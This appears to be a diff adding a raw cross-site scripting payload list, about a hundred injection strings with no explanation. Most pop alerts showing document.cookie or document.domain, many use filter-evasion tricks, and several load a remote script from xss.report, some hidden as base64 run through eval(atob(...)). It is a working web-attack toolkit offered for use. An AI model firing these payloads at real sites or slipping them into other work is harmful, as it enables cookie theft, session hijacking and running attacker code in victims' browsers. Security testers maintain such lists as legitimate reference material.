@@ -1,0 +1,108 @@
+<font color="red">YUP ITS VULNERABLE
+<img src/onerror=prompt(document.cookie)>
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+"><Svg/OnLoad=alert(document.cookie)>"@gmail.com
+">'><script>alert(document.domain)</script>
+'%22%3E%3Cscript%20src=https://xss.report/c/wq10%3E%3C/script%3E
+%22%3E%3Cimg%20src=x%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3dxMTAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%20onerror=eval(atob(this.id))%3E
+'>"<svg/onload​=confirm('xss-section')%3e
+<input/onfocus=prompt(document.domain) autofocus>
+"><input/onfocus=prompt(document.domain) autofocus>
+javascript:alert(document.cookie)
+(A(%22onerror='alert%601%60'testabcd))
+"></script><script>alert(document.cookie)</script>
+(1,alert)(7*7)]
+%3cacript%3ewindow%5b"al"+"ert"%5d%3c/script%3e
+"><img src=x onerror=prompt(document.domain)>
+</script><img src=x onerror=prompt(document.domain)>
+"><body onresize=alert(1)><img src=x>
+test"></noscript><img src=x onerror=prompt(document.domain)>
+"><sVg/luffy="x=y"%20oNload%3Dconfirm%281%29%3B%3E//
+<abdool attr=" --- x="=='='onmouseover=confirm`abdool` style="display:block;width:1000px;height:1000px;background:red"> --- ">
+<iframe> src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<script>alert(1)</script>
+'"><script src=//xss.report/s/wq10></script>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL3dxMTAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'//xss.report/s/wq10\';document.body.appendChild(a)')
+';"/></textarea></script><script/src=https://xss.report/c/wq10></script>
+'"></title></textarea></script></style></noscript><script src=https://xss.report/c/wq10></script>
+'"></title></textarea></script></style></noscript><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3dxMTAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+"><img src=x onerror=prompt(document.domain)>
+%22%20%2C%20internalSearchTerm%3A%20%5B7%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b
+injection%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
+<abdool attr=" --- x="=='='onmouseover=confirm`abdool` style="display:block;width:1000px;height:1000px;background:red"> --- ">
+test<svg on onload=(alert)(document.domain)>
+“><script>alert(document.cookie)</script>
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
+<% foo><x foo="%><script>javascript:alert(1)</script>">
+<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
+<img \x00src=x onerror="alert(1)">
+<img \x47src=x onerror="javascript:alert(1)">
+<img \x11src=x onerror="javascript:alert(1)">
+`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
+<script>javascript:alert(1)<\x00/script>
+<img src=# onerror\x3D"javascript:alert(1)" >
+<input onfocus=javascript:alert(1) autofocus>
+<input onblur=javascript:alert(1) autofocus><input autofocus>
+<video poster=javascript:javascript:alert(1)//
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
+<video><source onerror="javascript:javascript:alert(1)">
+<video onerror="javascript:javascript:alert(1)"><source>
+<form><button formaction="javascript:javascript:alert(1)">X
+<body oninput=javascript:alert(1)><input autofocus>
+<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
+<frameset onload=javascript:alert(1)>
+<table background="javascript:javascript:alert(1)">
+<h1>INJECTX</h1>
+<img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)>
+<svg><script>/<@/>alert(1)</script>//INJECTX
+<svg/onload=alert(/INJECTX/)>
+<iframe/onload=alert(/INJECTX/)>
+<svg/onload=alert`INJECTX`>
+<svg/onload=alert(/INJECTX/)>
+<svg/onload=alert(`INJECTX`)>
+}alert(/INJECTX/);{//
+<h1/onclick=alert(1)>a//INJECTX
+<svg/onload=alert(/INJECTX/)>
+<p/onclick=alert(/INJECTX/)>a
+<svg/onload=alert`INJECTX`>
+<svg/onload=alert(/INJECTX/)>
+<svg/onload=alert(`INJECTX`)>
+<video><source onerror="javascript:alert(1)">//INJECTX
+<video onerror="javascript:alert(1)"><source>//INJECTX
+<audio onerror="javascript:alert(1)"><source>//INJECTX
+<input autofocus onfocus=alert(1)>//INJECTX
+<select autofocus onfocus=alert(1)>//INJECTX
+<textarea autofocus onfocus=alert(1)>//INJECTX
+<keygen autofocus onfocus=alert(1)>//INJECTX
+<button form=test onformchange=alert(1)>//INJECTX
+<form><button formaction="javascript:alert(1)">//INJECTX
+<svg onload=(alert)(1) >//INJECTX
+<script>$=1,alert($)</script>//INJECTX
+<!--<img src="--><img src=x onerror=alert(1)//">//INJECTX
+<img/src='x'onerror=alert(1)>//INJECTX
+“><script >alert(document.cookie)</script >
+“><ScRiPt>alert(document.cookie)</ScRiPt>
+“%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+%00“><script>alert(document.cookie)</script>
+#”onclick=”javascript:alert(1)
+javascript://%250Aalert(1)
+"><sVg/luffy="x=y"%20oNload%3Dconfirm%281%29%3B%3E//
+“><script >alert(document.cookie)</script >
+“><ScRiPt>alert(document.cookie)</ScRiPt>
+“%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+%00“><script>alert(document.cookie)</script>
+de_DE"><img src=x Onerror="top[8680439..toString(30)](document.cookie)">
+"><a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe>
+Onerror="top[8680439..toString(30)](document.cookie)"
+self['\x61\x6c\x65\x72\x74']('\x58\x53\x53')
+jaVasCript:/*-/*`/*\`/*’/*”/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/ — !>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+"></script><script>alert(1)</script>
+"></script><script>alert(document.cookie)</script>
+
+
